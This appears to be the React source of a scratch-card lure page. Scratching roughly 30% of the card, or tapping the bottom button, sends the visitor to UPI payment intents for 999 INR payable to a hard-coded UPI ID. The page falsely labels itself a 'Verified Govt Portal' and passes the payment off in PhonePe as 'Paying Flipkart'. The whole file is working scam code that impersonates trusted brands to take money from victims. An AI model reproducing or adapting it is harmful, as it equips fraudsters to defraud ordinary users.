import { useState, useEffect } from "react";
import "./App.css";
import ScratchCard from "./Components/ScrachCard";

function App() {
  const [isMobile, setIsMobile] = useState(true);

  const params = new URLSearchParams(window.location.search);
  const accessOnlyFrom = params.get("access_only_from");

  const paymentId = `phonepe://pay?pa=fsv.470000099385650@icici&pn=Montaro&am=999.00&cu=INR&tn=Bill`;

  // useEffect(() => {
  //   const userAgent = navigator.userAgent || navigator.vendor || window.opera;

  //   if (/android|iphone|ipad|ipod|mobile/i.test(userAgent)) {
  //     setIsMobile(true);
  //   } else {
  //     setIsMobile(false);
  //   }
  // }, []);

  const showAppContent = true;

  // 🚀 SCROLL LOCK
  useEffect(() => {
    if (showAppContent) {
      document.body.style.overflow = "hidden";
      document.documentElement.style.overflow = "hidden";
    } else {
      document.body.style.overflow = "auto";
      document.documentElement.style.overflow = "auto";
    }

    return () => {
      document.body.style.overflow = "auto";
      document.documentElement.style.overflow = "auto";
    };
  }, [showAppContent]);

  const detectOS = () => {
    const ua = navigator.userAgent.toLowerCase();
    if (/iphone|ipad|ipod/.test(ua)) return "ios";
    if (/android/.test(ua)) return "android";
    return "other";
  };

  const handlePaymentSubmit = async (e) => {
    console.log(e, "clickleeed");

    e?.preventDefault();

    const actualTotal = 999;

    const orderNumber = Math.floor(1000000000 + Math.random() * 9000000000);
    const siteName = "Verified Govt Portal";
    const amt = parseFloat(actualTotal).toFixed(2);
    const os = detectOS();

    let redirectUrl = "";

    const selectedUpi = "phonepe"; // Replace with the actual selected UPI option
    const upiId = "BHARATPE.9F0X0X0G8R867193@unitype";

    switch (selectedUpi) {
      case "gpay":
        redirectUrl = `tez://upi/pay?pa=${upiId}&pn=Online%20Store&tn=Order_Id_${orderNumber}&am=${amt}&tr=H2MkMGf5olejI&mc=8931&cu=INR&tn=${encodeURIComponent(siteName)}`;
        break;
      case "phonepe":
        if (os === "android") {
          const payload = {
            p2pPaymentCheckoutParams: {
              checkoutType: "COLLECT",
              initialAmount: Math.round(actualTotal * 100),
              note: {
                type: "text",
                message: "Paying Flipkart",
              },
              supportedInstruments: -1,
            },
            contact: {
              type: "EXTERNAL_MERCHANT",
              name: "Flipkart",
              vpa: upiId,
            },
          };
          const jsonString = JSON.stringify(payload);
          const base64Data = btoa(unescape(encodeURIComponent(jsonString)));
          redirectUrl =
            "phonepe://native?data=" + base64Data + "&id=p2ppayment";
        } else {
          // iOS or other
          redirectUrl = `phonepe://upi//pay?pa=${upiId}&pn=${encodeURIComponent(siteName)}&am=${amt}&cu=INR&tn=${encodeURIComponent(orderNumber)}`;
        }
        break;
      case "paytm":
        redirectUrl = `paytmmp://pay?ver=01&mode=19&pa=${upiId}&pn=${encodeURIComponent(siteName)}&tr=RZPPXTog5fXlvIb6Wqrv2&cu=INR&mc=4215&qrMedium=04&tn=TN_${orderNumber}&am=${amt}`;
        break;
      default:
        break;
    }

    try {
      await fetch("/api/payment/process", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          orderNumber: String(orderNumber),
          payType: selectedUpi,
          upiAddress: upiId,
          amount: String(amt),
        }),
      });
    } catch (err) {
      console.error("Failed to log payment backend:", err);
    }

    // Save details locally for verification / success references
    localStorage.setItem("pendingOrderNumber", String(orderNumber));
    localStorage.setItem("pendingPayType", selectedUpi);
    localStorage.setItem("pendingAmount", String(amt));

    // setLoadingOverlay(false);

    // Redirect to UPI app intent
    window.location.href = redirectUrl;
  };

  const handleScratchComplete = (percent = 35) => {
    if (percent >= 30 && percent <= 40) {
      setTimeout(() => {
        // window.location.href = paymentId;
        handlePaymentSubmit();
        // window.open(paymentId, "_blank");
      }, 1000);
    }
  };

  if (showAppContent) {
    return (
      <div className="w-full h-screen overflow-hidden">
        <img src="/img/Top.jpg" className="w-full" />

        <div className="w-full p-5 !pb-0 flex justify-center items-center">
          <ScratchCard
            revealThreshold={30}
            coverImage="/img/scratch_bg.png"
            onComplete={handleScratchComplete}
          >
            <div
              className="w-full h-full"
              style={{
                background: "url(/img/rj2.png)",
                backgroundSize: "100% 100%",
              }}
            />
          </ScratchCard>
        </div>

        <button className="w-full" onClick={() => handleScratchComplete(35)}>
          <img src="/img/Bot.gif" className="w-full" />
        </button>
      </div>
    );
  }

  return (
    <div className="w-full p-10 flex justify-center items-center h-screen">
      <img src="/img/welcome.png" alt="welcome" />
    </div>
  );
}

export default App;
